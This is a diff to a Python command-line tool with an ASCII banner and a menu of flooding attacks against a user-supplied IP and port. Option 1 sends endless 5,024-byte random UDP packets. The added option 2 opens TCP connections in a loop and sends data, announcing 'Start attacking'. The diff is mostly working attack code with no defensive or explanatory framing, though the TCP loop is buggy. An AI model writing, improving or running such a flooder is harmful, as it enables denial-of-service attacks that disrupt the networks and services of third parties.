@@ -4,6 +4,7 @@ import sys
 import time
 import cmd
 import os
+os.system('chcp 65001')
 print("+==================================================================+")
 print("|    ███████              █████      ███   █████              ████ |")
 print("|  ███░░░░░███           ░░███      ░░░   ░░███              ░░███ |")
@@ -15,6 +16,7 @@ print("| ░░░███████░   █████     █████
 print("|   ░░░░░░░    ░░░░░     ░░░░░░░░  ░░░░░    ░░░░░   ░░░░░░░░ ░░░░░ |")
 print("+==================================================================+")
 print("tst")
+
 
 def choice_prompt():
     print("Select an option:")
@@ -32,14 +34,27 @@ if choice == "1":
   packet = os.urandom(5024)
   client.sendto(packet, (target_ip, ipport))
   print("Targeting {target_ip}:{ipport} with UDP packet")
-try:
-  while True:
-      client.sendto(packet, (target_ip, ipport))
-      print(f"Packet sent to {target_ip}:{ipport}")
-except KeyboardInterrupt:
- client.close()
- sys.exit()
+  try:
+   while True:
+       client.sendto(packet, (target_ip, ipport))
+       print(f"Packet sent to {target_ip}:{ipport}")
+  except KeyboardInterrupt:
+   client.close()
+   sys.exit()
+elif choice == "2":
+ target_ip = input("IP --> ")
+ ipport = int(input("IP PORT --> "))
 
+ client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ print(f"Start attacking on {target_ip}{ipport}")
+ 
+ try:
+    while True:
+        client.connect((target_ip,ipport))
+        client.send(b"\x10" * 1024)
+        print(f"sending attack {target_ip}:{ipport}")
+ except socket.error:
+       print("ERROR")
 
 
 #elif choice == "2":
